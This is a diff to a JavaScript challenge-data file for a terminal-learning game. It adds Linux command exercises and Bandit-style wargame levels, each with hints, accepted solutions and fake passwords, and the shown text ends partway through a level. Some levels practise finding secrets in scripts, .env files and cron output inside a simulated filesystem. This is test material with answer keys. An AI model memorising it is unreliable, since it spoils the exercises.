@@ -1,5 +1,5 @@
 // ============================================================================
-// TERMINAL CHALLENGE — Challenge Data (150 Challenges)
+// TERMINAL CHALLENGE — Challenge Data (300 Challenges)
 // ============================================================================
 
 const CHALLENGES = {
@@ -494,6 +494,334 @@ const CHALLENGES = {
       hints: ['grep -rl finds files containing text.', 'Pipe to xargs rm.'],
       solutions: ['grep -rl "TODO" . | xargs rm', "grep -rl 'TODO' . | xargs rm"],
       successMessage: '🔗 Pipeline mastered!'
+    },
+
+    // ---- NEW EASY (10): cmd-61 to cmd-70 ----
+    {
+      id: 'cmd-61', title: 'Calendar', difficulty: 'easy', xp: 10,
+      description: 'Display the current month\'s calendar.',
+      objective: 'Use the cal command.',
+      hints: ['A three-letter command.', 'cal shows a calendar.'],
+      solutions: ['cal'],
+      successMessage: '📅 Calendar displayed!'
+    },
+    {
+      id: 'cmd-62', title: 'System Uptime', difficulty: 'easy', xp: 10,
+      description: 'Show how long the system has been running.',
+      objective: 'Check system uptime.',
+      hints: ['The command literally means how long it has been up.', 'uptime'],
+      solutions: ['uptime'],
+      successMessage: '⏱️ Uptime checked!'
+    },
+    {
+      id: 'cmd-63', title: 'Hostname', difficulty: 'easy', xp: 10,
+      description: 'Display the system\'s hostname.',
+      objective: 'Find the name of this machine.',
+      hints: ['The command is the same as the concept.', 'hostname'],
+      solutions: ['hostname'],
+      successMessage: '🖥️ Hostname revealed!'
+    },
+    {
+      id: 'cmd-64', title: 'System Info', difficulty: 'easy', xp: 10,
+      description: 'Display all system information using uname.',
+      objective: 'Get kernel and OS details.',
+      hints: ['uname shows system info.', '-a flag shows all info.'],
+      solutions: ['uname -a'],
+      successMessage: '🖥️ Full system info displayed!'
+    },
+    {
+      id: 'cmd-65', title: 'Environment Variables', difficulty: 'easy', xp: 10,
+      description: 'Print all environment variables.',
+      objective: 'List all environment variables.',
+      hints: ['Three letters: env.', 'Or use printenv.'],
+      solutions: ['env', 'printenv'],
+      successMessage: '🌐 Environment variables listed!'
+    },
+    {
+      id: 'cmd-66', title: 'Create Alias', difficulty: 'easy', xp: 10,
+      description: 'Create an alias called "ll" that runs "ls -la".',
+      objective: 'Set up a command shortcut.',
+      hints: ['alias name=command', 'Put the command in quotes.'],
+      solutions: ['alias ll="ls -la"', "alias ll='ls -la'"],
+      successMessage: '⚡ Alias created!'
+    },
+    {
+      id: 'cmd-67', title: 'Command History', difficulty: 'easy', xp: 10,
+      description: 'Display the command history.',
+      objective: 'View previously executed commands.',
+      hints: ['The command is the same as the concept.', 'history'],
+      solutions: ['history'],
+      successMessage: '📜 Command history revealed!'
+    },
+    {
+      id: 'cmd-68', title: 'Manual Pages', difficulty: 'easy', xp: 10,
+      description: 'Open the manual page for the "ls" command.',
+      objective: 'Learn to read documentation.',
+      hints: ['man is short for manual.', 'man followed by command name.'],
+      solutions: ['man ls'],
+      successMessage: '📖 Manual page opened!'
+    },
+    {
+      id: 'cmd-69', title: 'Which Command', difficulty: 'easy', xp: 10,
+      description: 'Find the full path of the "python3" executable.',
+      objective: 'Locate where a command lives.',
+      hints: ['which shows the path to a command.', 'which command_name'],
+      solutions: ['which python3'],
+      successMessage: '📍 Command location found!'
+    },
+    {
+      id: 'cmd-70', title: 'Word Count', difficulty: 'easy', xp: 10,
+      description: 'Count the number of words in "essay.txt".',
+      objective: 'Use word count with the words flag.',
+      hints: ['wc counts things.', '-w counts words.'],
+      solutions: ['wc -w essay.txt'],
+      successMessage: '🔢 Words counted!'
+    },
+
+    // ---- NEW MEDIUM (10): cmd-71 to cmd-80 ----
+    {
+      id: 'cmd-71', title: 'Symbolic Link', difficulty: 'medium', xp: 25,
+      description: 'Create a symbolic link called "shortcut" pointing to "/var/log/syslog".',
+      objective: 'Create a soft link to a file.',
+      hints: ['ln creates links.', '-s makes it symbolic.'],
+      solutions: ['ln -s /var/log/syslog shortcut'],
+      successMessage: '🔗 Symbolic link created!'
+    },
+    {
+      id: 'cmd-72', title: 'File Differences', difficulty: 'medium', xp: 25,
+      description: 'Compare "file_a.txt" and "file_b.txt" to show their differences.',
+      objective: 'Find differences between two files.',
+      hints: ['diff compares files.', 'diff file1 file2'],
+      solutions: ['diff file_a.txt file_b.txt'],
+      successMessage: '🔀 Differences found!'
+    },
+    {
+      id: 'cmd-73', title: 'Cut Columns', difficulty: 'medium', xp: 25,
+      description: 'Extract the first column from "data.csv" using comma as delimiter.',
+      objective: 'Cut specific fields from structured data.',
+      hints: ['cut extracts fields.', '-d sets delimiter, -f selects fields.'],
+      solutions: ['cut -d, -f1 data.csv', 'cut -d "," -f1 data.csv', "cut -d ',' -f1 data.csv"],
+      successMessage: '✂️ Column extracted!'
+    },
+    {
+      id: 'cmd-74', title: 'Paste Files', difficulty: 'medium', xp: 25,
+      description: 'Merge "names.txt" and "scores.txt" side by side with a tab separator.',
+      objective: 'Combine files horizontally.',
+      hints: ['paste merges files line by line.', 'paste file1 file2'],
+      solutions: ['paste names.txt scores.txt'],
+      successMessage: '📋 Files merged!'
+    },
+    {
+      id: 'cmd-75', title: 'Tee Output', difficulty: 'medium', xp: 25,
+      description: 'Run "ls -la" and save the output to "listing.txt" while also displaying it.',
+      objective: 'Write to file and stdout simultaneously.',
+      hints: ['tee reads from stdin and writes to both stdout and a file.', 'Pipe ls output to tee.'],
+      solutions: ['ls -la | tee listing.txt'],
+      successMessage: '📝 Output teed!'
+    },
+    {
+      id: 'cmd-76', title: 'Base Name', difficulty: 'medium', xp: 25,
+      description: 'Extract just the filename from the path "/home/user/documents/report.pdf".',
+      objective: 'Strip directory from a path.',
+      hints: ['basename strips directory prefixes.', 'basename /path/to/file'],
+      solutions: ['basename /home/user/documents/report.pdf'],
+      successMessage: '📄 Filename extracted!'
+    },
+    {
+      id: 'cmd-77', title: 'Directory Name', difficulty: 'medium', xp: 25,
+      description: 'Extract just the directory path from "/home/user/documents/report.pdf".',
+      objective: 'Get the directory component of a path.',
+      hints: ['dirname is the opposite of basename.', 'dirname /path/to/file'],
+      solutions: ['dirname /home/user/documents/report.pdf'],
+      successMessage: '📂 Directory path extracted!'
+    },
+    {
+      id: 'cmd-78', title: 'File Statistics', difficulty: 'medium', xp: 25,
+      description: 'Display detailed file information (size, permissions, timestamps) for "config.ini".',
+      objective: 'Get comprehensive file metadata.',
+      hints: ['stat shows detailed file info.', 'stat filename'],
+      solutions: ['stat config.ini'],
+      successMessage: '📊 File stats retrieved!'
+    },
+    {
+      id: 'cmd-79', title: 'Split File', difficulty: 'medium', xp: 25,
+      description: 'Split "bigfile.txt" into chunks of 100 lines each.',
+      objective: 'Break a large file into smaller pieces.',
+      hints: ['split divides files.', '-l specifies lines per chunk.'],
+      solutions: ['split -l 100 bigfile.txt', 'split -l100 bigfile.txt'],
+      successMessage: '✂️ File split into chunks!'
+    },
+    {
+      id: 'cmd-80', title: 'Common Lines', difficulty: 'medium', xp: 25,
+      description: 'Find lines common to both "list1.txt" and "list2.txt" (both sorted).',
+      objective: 'Compare sorted files for shared content.',
+      hints: ['comm compares sorted files.', '-12 shows only common lines.'],
+      solutions: ['comm -12 list1.txt list2.txt'],
+      successMessage: '🔍 Common lines found!'
+    },
+
+    // ---- NEW HARD (10): cmd-81 to cmd-90 ----
+    {
+      id: 'cmd-81', title: 'Firewall Rules', difficulty: 'hard', xp: 50,
+      description: 'List all current iptables firewall rules.',
+      objective: 'Inspect the firewall configuration.',
+      hints: ['iptables manages firewall rules.', '-L lists all rules.'],
+      solutions: ['iptables -L', 'sudo iptables -L'],
+      successMessage: '🔥 Firewall rules listed!'
+    },
+    {
+      id: 'cmd-82', title: 'Open Files', difficulty: 'hard', xp: 50,
+      description: 'List all open files on the system.',
+      objective: 'See what files are currently in use.',
+      hints: ['lsof = list open files.', 'Just run the command by itself.'],
+      solutions: ['lsof', 'sudo lsof'],
+      successMessage: '📂 Open files listed!'
+    },
+    {
+      id: 'cmd-83', title: 'Trace System Calls', difficulty: 'hard', xp: 50,
+      description: 'Trace the system calls made by the "ls" command.',
+      objective: 'Debug a program at the syscall level.',
+      hints: ['strace traces system calls.', 'strace command'],
+      solutions: ['strace ls'],
+      successMessage: '🔬 System calls traced!'
+    },
+    {
+      id: 'cmd-84', title: 'Listening Ports', difficulty: 'hard', xp: 50,
+      description: 'Show all TCP and UDP listening ports with process names.',
+      objective: 'Identify active network services.',
+      hints: ['ss is the modern socket statistics tool.', '-tuln shows TCP/UDP listening numeric.'],
+      solutions: ['ss -tuln', 'ss -tulnp'],
+      successMessage: '🌐 Listening ports revealed!'
+    },
+    {
+      id: 'cmd-85', title: 'Service Status', difficulty: 'hard', xp: 50,
+      description: 'Check the status of the "nginx" service using systemctl.',
+      objective: 'Manage systemd services.',
+      hints: ['systemctl controls services.', 'systemctl status service_name'],
+      solutions: ['systemctl status nginx'],
+      successMessage: '⚙️ Service status checked!'
+    },
+    {
+      id: 'cmd-86', title: 'System Logs', difficulty: 'hard', xp: 50,
+      description: 'View the last 50 lines of the system journal using journalctl.',
+      objective: 'Read systemd journal logs.',
+      hints: ['journalctl reads the journal.', '-n specifies number of lines.'],
+      solutions: ['journalctl -n 50'],
+      successMessage: '📋 Journal logs displayed!'
+    },
+    {
+      id: 'cmd-87', title: 'Chroot Jail', difficulty: 'hard', xp: 50,
+      description: 'Change the root directory to "/jail" and run /bin/bash.',
+      objective: 'Create an isolated filesystem environment.',
+      hints: ['chroot changes the apparent root directory.', 'chroot newroot command'],
+      solutions: ['chroot /jail /bin/bash', 'sudo chroot /jail /bin/bash'],
+      successMessage: '🔒 Chroot jail entered!'
+    },
+    {
+      id: 'cmd-88', title: 'Disk Clone', difficulty: 'hard', xp: 50,
+      description: 'Create a disk image of /dev/sda to "backup.img" using dd.',
+      objective: 'Clone a disk or partition.',
+      hints: ['dd copies and converts data.', 'if= input, of= output.'],
+      solutions: ['dd if=/dev/sda of=backup.img', 'sudo dd if=/dev/sda of=backup.img'],
+      successMessage: '💾 Disk cloned!'
+    },
+    {
+      id: 'cmd-89', title: 'Remote Sync', difficulty: 'hard', xp: 50,
+      description: 'Synchronize the local "src/" directory to "backup/" preserving all attributes.',
+      objective: 'Efficiently sync directories.',
+      hints: ['rsync synchronizes files.', '-av preserves attributes and is verbose.'],
+      solutions: ['rsync -av src/ backup/', 'rsync -av src/ backup'],
+      successMessage: '🔄 Directories synced!'
+    },
+    {
+      id: 'cmd-90', title: 'Cron Jobs', difficulty: 'hard', xp: 50,
+      description: 'List all scheduled cron jobs for the current user.',
+      objective: 'View scheduled tasks.',
+      hints: ['crontab manages cron jobs.', '-l lists the current crontab.'],
+      solutions: ['crontab -l'],
+      successMessage: '⏰ Cron jobs listed!'
+    },
+
+    // ---- NEW EXPERT (10): cmd-91 to cmd-100 ----
+    {
+      id: 'cmd-91', title: 'Awk Sum Column', difficulty: 'expert', xp: 100,
+      description: 'Use awk to sum all values in the first column of "numbers.txt" and print the total.',
+      objective: 'Perform arithmetic with awk.',
+      hints: ['awk can accumulate values.', '{sum+=$1} END {print sum}'],
+      solutions: ["awk '{sum+=$1} END {print sum}' numbers.txt"],
+      successMessage: '🧮 Column summed with awk!'
+    },
+    {
+      id: 'cmd-92', title: 'Sed Multiline', difficulty: 'expert', xp: 100,
+      description: 'Use sed to delete all empty lines from "messy.txt" in-place.',
+      objective: 'Edit files with advanced sed patterns.',
+      hints: ['sed -i edits in-place.', '/^$/d deletes empty lines.'],
+      solutions: ["sed -i '/^$/d' messy.txt", "sed -i '/^[[:space:]]*$/d' messy.txt"],
+      successMessage: '✏️ Empty lines purged!'
+    },
+    {
+      id: 'cmd-93', title: 'Regex Extract', difficulty: 'expert', xp: 100,
+      description: 'Use grep with extended regex to find all email addresses in "contacts.txt".',
+      objective: 'Extract patterns with regular expressions.',
+      hints: ['grep -E enables extended regex.', '-o outputs only the matching part.'],
+      solutions: ["grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' contacts.txt", 'grep -E -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}" contacts.txt'],
+      successMessage: '📧 Emails extracted!'
+    },
+    {
+      id: 'cmd-94', title: 'Process Substitution', difficulty: 'expert', xp: 100,
+      description: 'Use process substitution to diff the sorted outputs of two files without creating temp files.',
+      objective: 'Master Bash process substitution.',
+      hints: ['<(command) creates a virtual file from command output.', 'diff <(sort file1) <(sort file2)'],
+      solutions: ['diff <(sort file_a.txt) <(sort file_b.txt)'],
+      successMessage: '🔀 Process substitution mastered!'
+    },
+    {
+      id: 'cmd-95', title: 'Trap Signals', difficulty: 'expert', xp: 100,
+      description: 'Set a trap to print "Caught SIGINT!" when Ctrl+C is pressed.',
+      objective: 'Handle Unix signals in shell scripts.',
+      hints: ['trap catches signals.', 'trap "command" SIGINT'],
+      solutions: ['trap "echo Caught SIGINT!" SIGINT', "trap 'echo Caught SIGINT!' SIGINT", 'trap "echo Caught SIGINT!" INT'],
+      successMessage: '🪤 Signal trapped!'
+    },
+    {
+      id: 'cmd-96', title: 'Here Document', difficulty: 'expert', xp: 100,
+      description: 'Use a here document to write three lines ("line1", "line2", "line3") to "output.txt".',
+      objective: 'Create multi-line input with heredoc.',
+      hints: ['<<EOF starts a here document.', 'cat > file <<EOF ... EOF'],
+      solutions: ['cat > output.txt <<EOF\\nline1\\nline2\\nline3\\nEOF'],
+      successMessage: '📝 Heredoc written!'
+    },
+    {
+      id: 'cmd-97', title: 'Named Pipe', difficulty: 'expert', xp: 100,
+      description: 'Create a named pipe (FIFO) called "mypipe" using mkfifo.',
+      objective: 'Create inter-process communication channels.',
+      hints: ['mkfifo creates named pipes.', 'mkfifo pipename'],
+      solutions: ['mkfifo mypipe'],
+      successMessage: '🔧 Named pipe created!'
+    },
+    {
+      id: 'cmd-98', title: 'Brace Expansion', difficulty: 'expert', xp: 100,
+      description: 'Create directories "project/src", "project/bin", and "project/docs" in one command using brace expansion.',
+      objective: 'Use shell brace expansion for efficiency.',
+      hints: ['Braces expand to multiple items.', 'mkdir -p project/{src,bin,docs}'],
+      solutions: ['mkdir -p project/{src,bin,docs}'],
+      successMessage: '📁 Brace expansion mastered!'
+    },
+    {
+      id: 'cmd-99', title: 'Parameter Expansion', difficulty: 'expert', xp: 100,
+      description: 'Given variable FILE="report.tar.gz", use parameter expansion to extract just "report" (remove all extensions).',
+      objective: 'Master Bash parameter expansion.',
+      hints: ['${var%%pattern} removes the longest matching suffix.', '${FILE%%.*}'],
+      solutions: ['echo ${FILE%%.*}'],
+      successMessage: '🧩 Parameter expansion mastered!'
+    },
+    {
+      id: 'cmd-100', title: 'Compound Commands', difficulty: 'expert', xp: 100,
+      description: 'Run "make build" and only if it succeeds, run "make test", and only if that succeeds, run "make deploy".',
+      objective: 'Chain commands with logical operators.',
+      hints: ['&& executes next command only if previous succeeds.', 'cmd1 && cmd2 && cmd3'],
+      solutions: ['make build && make test && make deploy'],
+      successMessage: '🏗️ Compound commands mastered! You are a Command Challenge champion!'
     }
   ],
 
@@ -1186,6 +1514,670 @@ const CHALLENGES = {
         'hint.txt': 'This is a victory lap. Just read the final_key.txt file.'
       },
       successMessage: '🏆🏆🏆 BANDIT MASTER ACHIEVED! You completed all 50 levels! 🏆🏆🏆'
+    },
+
+    // ---- NEW EASY (10): ban-51 to ban-60 ----
+    {
+      id: 'ban-51', title: 'Level 50: Nested Dirs', difficulty: 'easy', xp: 15,
+      description: 'The password is hidden in a deeply nested directory structure: dir1/dir2/dir3/secret.txt.',
+      objective: 'Navigate nested directories.',
+      hints: ['Use cat with the full path.', 'cat dir1/dir2/dir3/secret.txt'],
+      password: 'xJ4Kn9pQ2wR7vL3m',
+      solutions: ['cat dir1/dir2/dir3/secret.txt'],
+      filesystem: {
+        'dir1/': '(directory)',
+        'dir1/dir2/': '(directory)',
+        'dir1/dir2/dir3/': '(directory)',
+        'dir1/dir2/dir3/secret.txt': 'xJ4Kn9pQ2wR7vL3m',
+        'dir1/decoy.txt': 'Not the password!'
+      },
+      successMessage: '📂 Nested directories conquered!'
+    },
+    {
+      id: 'ban-52', title: 'Level 51: File Size Filter', difficulty: 'easy', xp: 15,
+      description: 'There are many files here. The password is in the only file that is exactly 33 bytes.',
+      objective: 'Find files by size.',
+      hints: ['Use find with -size.', 'find . -size 33c'],
+      password: 'mB8qT5yK2nW9xR4p',
+      solutions: ['find . -size 33c', 'find . -size 33c -exec cat {} \\;'],
+      filesystem: {
+        'file_a.txt': 'This is a decoy file with extra padding to make it bigger than 33 bytes',
+        'file_b.txt': 'mB8qT5yK2nW9xR4p',
+        'file_c.txt': 'Another long decoy file that is definitely not 33 bytes in total size'
+      },
+      successMessage: '📏 File size filtering mastered!'
+    },
+    {
+      id: 'ban-53', title: 'Level 52: Multiple Hidden', difficulty: 'easy', xp: 15,
+      description: 'Multiple hidden files exist. The password is in the file named ".password" (not .secret, .hidden, or .config).',
+      objective: 'Find the right hidden file.',
+      hints: ['Use ls -a to see all hidden files.', 'cat .password'],
+      password: 'gH7rN3kL9wQ5tY2x',
+      solutions: ['cat .password'],
+      filesystem: {
+        '.secret': 'Nope, not this one!',
+        '.hidden': 'Wrong file!',
+        '.config': '# config file\ntheme=dark',
+        '.password': 'gH7rN3kL9wQ5tY2x',
+        'readme.txt': 'Check the hidden files!'
+      },
+      successMessage: '🔍 Correct hidden file found!'
+    },
+    {
+      id: 'ban-54', title: 'Level 53: Follow the Link', difficulty: 'easy', xp: 15,
+      description: 'A symbolic link called "clue" points to the file containing the password. Follow it.',
+      objective: 'Read through symbolic links.',
+      hints: ['Symlinks can be read like regular files.', 'cat clue'],
+      password: 'pK4mR8wN2qT6yL3v',
+      solutions: ['cat clue', 'readlink clue', 'cat target.txt'],
+      filesystem: {
+        'clue': '-> target.txt (symlink)',
+        'target.txt': 'pK4mR8wN2qT6yL3v',
+        'fake_target.txt': 'This is not the real target!'
+      },
+      successMessage: '🔗 Symbolic link followed!'
+    },
+    {
+      id: 'ban-55', title: 'Level 54: Spaces in Name', difficulty: 'easy', xp: 15,
+      description: 'The password is in a file called "spaces in this filename". Read it carefully.',
+      objective: 'Handle filenames with spaces.',
+      hints: ['Use quotes around the filename.', 'cat "spaces in this filename"'],
+      password: 'wT9nK5rQ3mL7yH2x',
+      solutions: ['cat "spaces in this filename"', "cat 'spaces in this filename'", 'cat spaces\\ in\\ this\\ filename'],
+      filesystem: {
+        'spaces in this filename': 'wT9nK5rQ3mL7yH2x',
+        'spaces': 'Wrong file!',
+        'filename': 'Also wrong!'
+      },
+      successMessage: '📄 Spaces handled like a pro!'
+    },
+    {
+      id: 'ban-56', title: 'Level 55: Dashed Filename', difficulty: 'easy', xp: 15,
+      description: 'The password is in a file called "-" (a single dash). This is tricky!',
+      objective: 'Read files with special names.',
+      hints: ['A dash is interpreted as stdin.', 'Use ./ prefix or -- to stop option parsing.'],
+      password: 'vR3kN8mQ5wT2yL9p',
+      solutions: ['cat ./-', 'cat -- -'],
+      filesystem: {
+        '-': 'vR3kN8mQ5wT2yL9p',
+        'readme.txt': 'The file is literally named \"-\"'
+      },
+      successMessage: '➖ Dashed filename defeated!'
+    },
+    {
+      id: 'ban-57', title: 'Level 56: Line Number', difficulty: 'easy', xp: 15,
+      description: 'The password is on line 42 of "data.txt", which has 100 lines of random text.',
+      objective: 'Extract a specific line from a file.',
+      hints: ['sed can print specific lines.', "sed -n '42p' or head + tail combo."],
+      password: 'jL5kR9nQ3wT7mH2y',
+      solutions: ["sed -n '42p' data.txt", 'head -n 42 data.txt | tail -n 1'],
+      filesystem: {
+        'data.txt': '(100 lines of text, line 42 contains: jL5kR9nQ3wT7mH2y)'
+      },
+      successMessage: '📍 Line 42 extracted!'
+    },
+    {
+      id: 'ban-58', title: 'Level 57: Executable File', difficulty: 'easy', xp: 15,
+      description: 'One of the files here is executable. Run it to get the password.',
+      objective: 'Find and execute a file.',
+      hints: ['find . -executable -type f', 'Then run it with ./filename'],
+      password: 'qW8nR4kL2mT6yP3v',
+      solutions: ['./reveal_password', 'find . -executable -type f'],
+      filesystem: {
+        'reveal_password': '(executable) Output: qW8nR4kL2mT6yP3v',
+        'data.txt': 'No password here.',
+        'notes.txt': 'One of these files is executable...'
+      },
+      successMessage: '▶️ Executable found and run!'
+    },
+    {
+      id: 'ban-59', title: 'Level 58: Only Human Readable', difficulty: 'easy', xp: 15,
+      description: 'Multiple files exist but the password is in the only human-readable (ASCII text) file.',
+      objective: 'Identify file types.',
+      hints: ['Use the file command to check types.', 'file * shows all file types.'],
+      password: 'tK7mR2nQ9wL4yH5x',
+      solutions: ['file *', 'cat human_readable.txt'],
+      filesystem: {
+        'binary_file': '(binary data)',
+        'compressed.gz': '(gzip compressed)',
+        'human_readable.txt': 'tK7mR2nQ9wL4yH5x',
+        'image.png': '(PNG image data)'
+      },
+      successMessage: '📖 Human-readable file identified!'
+    },
+    {
+      id: 'ban-60', title: 'Level 59: Grep the Password', difficulty: 'easy', xp: 15,
+      description: 'The password is next to the word "FLAG:" in a file with 500 lines of noise.',
+      objective: 'Search for patterns in noisy data.',
+      hints: ['grep searches for patterns.', 'grep "FLAG:" data.txt'],
+      password: 'nR5kQ8mT3wL9yP2v',
+      solutions: ['grep "FLAG:" data.txt', "grep 'FLAG:' data.txt", 'grep FLAG: data.txt'],
+      filesystem: {
+        'data.txt': '(500 lines of noise, one line contains: FLAG: nR5kQ8mT3wL9yP2v)'
+      },
+      successMessage: '🔍 Pattern found in the noise!'
+    },
+
+    // ---- NEW MEDIUM (15): ban-61 to ban-75 ----
+    {
+      id: 'ban-61', title: 'Level 60: Base64 Decode', difficulty: 'medium', xp: 30,
+      description: 'The password is base64 encoded in "encoded.txt". Decode it.',
+      objective: 'Decode base64 encoded data.',
+      hints: ['base64 -d decodes base64.', 'cat encoded.txt | base64 -d'],
+      password: 'hK9mR4nQ7wT2yL5x',
+      solutions: ['base64 -d encoded.txt', 'cat encoded.txt | base64 -d', 'base64 --decode encoded.txt'],
+      filesystem: {
+        'encoded.txt': 'aEs5bVI0blE3d1QyeUw1eA==',
+        'hint.txt': 'This looks like base64 encoding...'
+      },
+      successMessage: '🔓 Base64 decoded!'
+    },
+    {
+      id: 'ban-62', title: 'Level 61: ROT13 Cipher', difficulty: 'medium', xp: 30,
+      description: 'The password in "cipher.txt" is ROT13 encoded. Decode it to find the real password.',
+      objective: 'Decode a ROT13 cipher.',
+      hints: ['ROT13 shifts each letter by 13 positions.', "Use tr 'A-Za-z' 'N-ZA-Mn-za-m'"],
+      password: 'wP3kR8nQ5mT9yL2v',
+      solutions: ["cat cipher.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'", "tr 'A-Za-z' 'N-ZA-Mn-za-m' < cipher.txt"],
+      filesystem: {
+        'cipher.txt': 'jC3xE8aD5zG9lY2i',
+        'hint.txt': 'ROT13: A becomes N, B becomes O...'
+      },
+      successMessage: '🔄 ROT13 cracked!'
+    },
+    {
+      id: 'ban-63', title: 'Level 62: Hex Decode', difficulty: 'medium', xp: 30,
+      description: 'The password is stored as hexadecimal values in "hex.txt". Convert it to ASCII.',
+      objective: 'Convert hex to ASCII text.',
+      hints: ['xxd -r -p converts hex to binary.', 'cat hex.txt | xxd -r -p'],
+      password: 'rT4kN7mQ2wL8yP5x',
+      solutions: ['cat hex.txt | xxd -r -p', 'xxd -r -p hex.txt'],
+      filesystem: {
+        'hex.txt': '7254346b4e376d5132774c387950357a',
+        'hint.txt': 'Hex encoding: each byte is two hex digits.'
+      },
+      successMessage: '🔢 Hex decoded!'
+    },
+    {
+      id: 'ban-64', title: 'Level 63: Reversed Text', difficulty: 'medium', xp: 30,
+      description: 'The password in "reversed.txt" is written backwards. Reverse it.',
+      objective: 'Reverse a string.',
+      hints: ['rev reverses text.', 'cat reversed.txt | rev'],
+      password: 'mK6nR3wQ9tL5yH8p',
+      solutions: ['cat reversed.txt | rev', 'rev reversed.txt'],
+      filesystem: {
+        'reversed.txt': 'p8Hy5Lt9Qw3Rn6Km',
+        'hint.txt': 'The text is backwards!'
+      },
+      successMessage: '🔄 Text reversed!'
+    },
+    {
+      id: 'ban-65', title: 'Level 64: Binary to Text', difficulty: 'medium', xp: 30,
+      description: 'The password is stored as binary numbers in "binary.txt" (space-separated bytes).',
+      objective: 'Convert binary to ASCII.',
+      hints: ['Each 8-bit group is a character.', "Use perl or python to convert."],
+      password: 'vN8kQ4mR7wT2yL9p',
+      solutions: ["perl -lape '$_=pack\"B*\",$_' binary.txt"],
+      filesystem: {
+        'binary.txt': '01110110 01001110 00111000 01101011 01010001 00110100 01101101 01010010 00110111 01110111 01010100 00110010 01111001 01001100 00111001 01110000'
+      },
+      successMessage: '💻 Binary decoded!'
+    },
+    {
+      id: 'ban-66', title: 'Level 65: Embedded in Script', difficulty: 'medium', xp: 30,
+      description: 'The password is embedded as a variable assignment inside "setup.sh". Extract it.',
+      objective: 'Find secrets hidden in scripts.',
+      hints: ['grep for variable assignments.', 'Look for PASSWORD= or SECRET=.'],
+      password: 'jR5kN9mQ3wT7yL2x',
+      solutions: ['grep PASSWORD setup.sh', 'grep SECRET setup.sh', 'cat setup.sh'],
+      filesystem: {
+        'setup.sh': '#!/bin/bash\\n# Setup script\\nexport PATH=/usr/local/bin:$PATH\\nDB_HOST=localhost\\nDB_PORT=5432\\nPASSWORD=jR5kN9mQ3wT7yL2x\\necho \"Setup complete\"'
+      },
+      successMessage: '📜 Script secret extracted!'
+    },
+    {
+      id: 'ban-67', title: 'Level 66: Unique Line', difficulty: 'medium', xp: 30,
+      description: 'The file "data.txt" has many repeated lines. The password is the only line that appears exactly once.',
+      objective: 'Find unique lines in data.',
+      hints: ['sort | uniq -u shows unique lines.', 'Lines that appear only once.'],
+      password: 'qT8kR4nQ6mW2yL9p',
+      solutions: ['sort data.txt | uniq -u'],
+      filesystem: {
+        'data.txt': '(Many repeated lines, one unique: qT8kR4nQ6mW2yL9p)'
+      },
+      successMessage: '✨ Unique line found!'
+    },
+    {
+      id: 'ban-68', title: 'Level 67: String in Binary', difficulty: 'medium', xp: 30,
+      description: 'The password is embedded as a readable string inside a binary file "program.bin".',
+      objective: 'Extract readable strings from binaries.',
+      hints: ['strings extracts readable text from binaries.', 'strings filename | grep password'],
+      password: 'wK7nR3mQ5tL9yH2x',
+      solutions: ['strings program.bin', 'strings program.bin | grep -i pass'],
+      filesystem: {
+        'program.bin': '(binary file containing embedded string: PASSWORD=wK7nR3mQ5tL9yH2x)'
+      },
+      successMessage: '🔬 String extracted from binary!'
+    },
+    {
+      id: 'ban-69', title: 'Level 68: Sorted Column', difficulty: 'medium', xp: 30,
+      description: 'The password is in "data.csv". It is the value in column 3 of the row where column 1 is "admin".',
+      objective: 'Extract data from CSV files.',
+      hints: ['grep "admin" to find the row.', 'Use cut or awk to get column 3.'],
+      password: 'pR6kN8mQ4wT3yL5v',
+      solutions: ['grep "admin" data.csv | cut -d, -f3', "grep admin data.csv | awk -F, '{print $3}'"],
+      filesystem: {
+        'data.csv': 'user,role,key\\nguest,viewer,abc123\\nadmin,superuser,pR6kN8mQ4wT3yL5v\\noperator,editor,xyz789'
+      },
+      successMessage: '📊 CSV data extracted!'
+    },
+    {
+      id: 'ban-70', title: 'Level 69: Env Variable', difficulty: 'medium', xp: 30,
+      description: 'The password is stored in an environment variable called SECRET_KEY. Print it.',
+      objective: 'Read environment variables.',
+      hints: ['echo $VARIABLE_NAME prints env vars.', 'Or use printenv VARIABLE_NAME.'],
+      password: 'kT5nR9mQ2wL7yH4x',
+      solutions: ['echo $SECRET_KEY', 'printenv SECRET_KEY'],
+      filesystem: {
+        '.env': 'SECRET_KEY=kT5nR9mQ2wL7yH4x',
+        'hint.txt': 'Check the environment variables...'
+      },
+      successMessage: '🌐 Environment variable read!'
+    },
+    {
+      id: 'ban-71', title: 'Level 70: Tar Archive', difficulty: 'medium', xp: 30,
+      description: 'The password is inside a tar archive "backup.tar". Extract and read it.',
+      objective: 'Extract files from tar archives.',
+      hints: ['tar xf extracts tar files.', 'tar xf archive.tar then read the files.'],
+      password: 'hR8kN4mQ6wT3yL9p',
+      solutions: ['tar xf backup.tar', 'tar xf backup.tar && cat password.txt'],
+      filesystem: {
+        'backup.tar': '(tar archive containing: password.txt with content hR8kN4mQ6wT3yL9p)',
+        'hint.txt': 'Extract the archive first.'
+      },
+      successMessage: '📦 Archive extracted!'
+    },
+    {
+      id: 'ban-72', title: 'Level 71: Gzip Compressed', difficulty: 'medium', xp: 30,
+      description: 'The password file has been gzip compressed. Decompress "secret.gz" to read it.',
+      objective: 'Handle compressed files.',
+      hints: ['gunzip or gzip -d decompresses.', 'Or use zcat to read without extracting.'],
+      password: 'nK7mR3wQ5tL9yP2v',
+      solutions: ['zcat secret.gz', 'gunzip secret.gz && cat secret', 'gzip -d secret.gz'],
+      filesystem: {
+        'secret.gz': '(gzip compressed file containing: nK7mR3wQ5tL9yP2v)'
+      },
+      successMessage: '🗜️ File decompressed!'
+    },
+    {
+      id: 'ban-73', title: 'Level 72: Cron Job Leak', difficulty: 'medium', xp: 30,
+      description: 'A cron job is writing secrets to a temp file. Check "/tmp/cron_output" for the password.',
+      objective: 'Investigate cron job outputs.',
+      hints: ['Cron jobs often write to /tmp.', 'cat /tmp/cron_output'],
+      password: 'rT6kN9mQ4wL2yH8p',
+      solutions: ['cat /tmp/cron_output', 'cat cron_output'],
+      filesystem: {
+        '/tmp/cron_output': 'Cron job executed at 03:00\\nGenerated key: rT6kN9mQ4wL2yH8p',
+        'crontab.txt': '0 3 * * * /opt/scripts/generate_key.sh > /tmp/cron_output'
+      },
+      successMessage: '⏰ Cron job secret captured!'
+    },
+    {
+      id: 'ban-74', title: 'Level 73: SSH Key Passphrase', difficulty: 'medium', xp: 30,
